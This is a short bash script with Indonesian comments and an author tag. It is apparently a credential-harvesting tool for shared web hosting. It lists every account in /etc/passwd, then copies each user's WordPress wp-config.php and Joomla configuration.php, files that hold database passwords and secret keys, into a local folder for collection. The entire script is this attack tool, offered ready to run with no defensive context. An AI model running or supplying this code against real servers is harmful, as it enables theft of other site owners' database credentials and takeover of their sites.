#!/bin/bash
echo "CREATE BY MATIGAN1337"
echo "-----------------------"

# Mendapatkan config dari openbasedir yang bisa di baca.

# Mendapatkan daftar nama pengguna dari /etc/passwd
usernames=$(awk -F: '{print $1}' /etc/passwd)

# Membuat folder baru untuk menyimpan output file
output_folder="config_outputs"
mkdir -p "$output_folder"

# Loop melalui setiap pengguna dan mencetak konfigurasi wp-config.php dan configuration.php jika ada
for user in $usernames
do
  config_path_wp="/home/$user/public_html/wp-config.php"
  config_path_joomla="/home/$user/public_html/configuration.php"
  
  # Mengecek apakah file wp-config.php ada
  if [ -f "$config_path_wp" ]; then
    # Menyimpan output file untuk WordPress ke folder utama dengan nama [username]-WP-config.txt
    output_file_wp="$output_folder/${user}-WP-config.txt"
    
    echo "WordPress Config for user $user:" >> "$output_file_wp"
    cat "$config_path_wp" >> "$output_file_wp"
    echo "----------------------------------" >> "$output_file_wp"
  fi

  # Mengecek apakah file configuration.php ada
  if [ -f "$config_path_joomla" ]; then
    # Menyimpan output file untuk Joomla ke folder utama dengan nama [username]-JOOMLA-config.txt
    output_file_joomla="$output_folder/${user}-JOOMLA-config.txt"
    
    echo "Joomla Config for user $user:" >> "$output_file_joomla"
    cat "$config_path_joomla" >> "$output_file_joomla"
    echo "----------------------------------" >> "$output_file_joomla"
  fi
done

echo "Script telah selesai. Output disimpan dalam folder $output_folder"
